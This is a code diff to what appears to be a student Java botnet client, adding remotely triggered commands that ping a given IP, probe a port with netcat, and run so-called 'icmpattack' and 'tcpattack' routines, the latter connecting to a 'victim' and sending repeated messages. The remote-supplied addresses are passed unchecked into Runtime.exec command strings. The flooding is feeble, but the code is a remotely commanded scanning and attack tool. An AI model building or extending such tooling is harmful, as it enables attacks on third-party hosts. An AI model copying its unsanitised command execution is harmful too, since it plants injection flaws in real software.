@@ -49,6 +49,88 @@ public static void main(String args[]) throws Exception {
 				os.println("10 seconds have passed ~ DONE!");
 				os.flush();
 			}
+      else if(response.equals("justip"))
+      {
+        String ipA=is.readLine();
+        System.out.println("Checking if "+ipA+" is online...");
+        //Runtime.getRuntime().exec("ping " + ipA);
+        Runtime rt = Runtime.getRuntime();
+        Process proc = rt.exec("ping "+ipA);
+        BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
+        System.out.println("Here is the output of the command:\n");
+        String s = null;
+        String op3="";
+        while ((s = stdInput.readLine()) != null)
+        {
+          System.out.println(s);
+          op3=op3+s+"\n";
+        }
+        os.println(op3);
+        os.flush();
+        os.println("justip ~ DONE!");
+        os.flush();
+      }
+      else if(response.equals("portip"))
+      {
+        String ipA=is.readLine();
+        int portn=Integer.parseInt(is.readLine());
+        System.out.println("Checking status of port "+portn+" of "+ipA+" is online...");
+      //  telnet <ip_address> <port_number>
+        Runtime rt = Runtime.getRuntime();
+        Process proc = rt.exec("nc -zv "+ipA+" "+portn);
+        BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
+        System.out.println("Here is the output of the command:\n");
+        String s = null;
+        String op3="";
+        while ((s = stdInput.readLine()) != null)
+        {
+          System.out.println(s);
+          op3=op3+s+"\n";
+        }
+        os.println(op3);
+        os.flush();
+        os.println("portip ~ DONE!");
+        os.flush();
+      }
+      else if(response.equals("icmpattack"))
+      {
+        System.out.println("Initiating ICMP attack...");
+      //  telnet <ip_address> <port_number>
+        String ipA=is.readLine();
+        Runtime rt = Runtime.getRuntime();
+        Process proc = rt.exec("ping "+ipA);
+        BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
+        System.out.println("Here is the output of the command:\n");
+        String s = null;
+        while ((s = stdInput.readLine()) != null)
+        {
+          System.out.println(s);
+        }
+        os.println("icmpattack ~ DONE!");
+        os.flush();
+      }
+      else if(response.equals("tcpattack"))
+      {
+        String ipA=is.readLine();
+        int portn=Integer.parseInt(is.readLine());
+        try{
+          Socket sock=new Socket(ipA, portn); //establishes connection
+          PrintWriter inpst=new PrintWriter(sock.getOutputStream());//gets inputstream to flood with messages
+          System.out.println("TCP connection with victim established...");
+          for(int qk=0;qk<20;qk++)//sends 20 messages in a duration of 5 seconds
+          {
+            inpst.println("attacking...");
+            inpst.flush();
+            Thread.sleep(250);
+          }
+
+        }
+        catch(Exception ex){
+          System.out.println("Unable to Establish connection...");
+        }
+        os.println("tcpattack ~ DONE!");
+        os.flush();
+      }
 			else{
 				System.out.println("No message received");
 			}
